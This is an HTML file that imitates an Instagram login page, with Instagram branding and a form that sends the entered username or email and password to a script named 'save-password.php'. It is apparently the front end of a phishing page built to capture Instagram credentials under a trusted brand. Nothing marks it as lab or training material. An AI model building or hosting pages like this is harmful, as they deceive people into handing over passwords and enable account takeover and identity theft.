<!DOCTYPE html>
<html>
<head>
  <title>Instagram Login</title>
  <style>
    /* Add your CSS here */
    body {
      background-color: #fafafa;
      font-family: sans-serif;
    }
    .login-container {
      width: 360px;
      background-color: #fff;
      box-shadow: 0 2px 2px rgba(0, 0, 0, 0.3);
      margin: 100px auto;
      border-radius: 3px;
    }
    .logo {
      text-align: center;
      padding: 20px 0;
    }
    .logo img {
      width: 100px;
    }
    .login-form {
      padding: 20px;
    }
    .login-form label {
      font-weight: bold;
      margin-bottom: 10px;
      display: block;
    }
    .login-form input[type="email"],
    .login-form input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 3px;
      margin-bottom: 10px;
    }
    .login-form input[type="submit"] {
      width: 100%;
      padding: 10px;
      background-color: #1da1f2;
      border: none;
      border-radius: 3px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
    }.login-form input[type="text"], .login-form input[type="password"] {
    width: 90%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 3px;
    margin-bottom: 10px;
}
</style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://thumbs.dreamstime.com/b/insta-new-155631943.jpg" alt="Instagram logo">
    </div>
    <form class="login-form" action="save-password.php" method="POST">
      <label for="username">Username or Email</label>
      <input type="text" name="email" required>
      <label for="password">Password</label>
      <input type="password" name="password">
      <input type="submit" name="sign-in" value="Sign in">
    </form>
  </div>
</body>
</html>

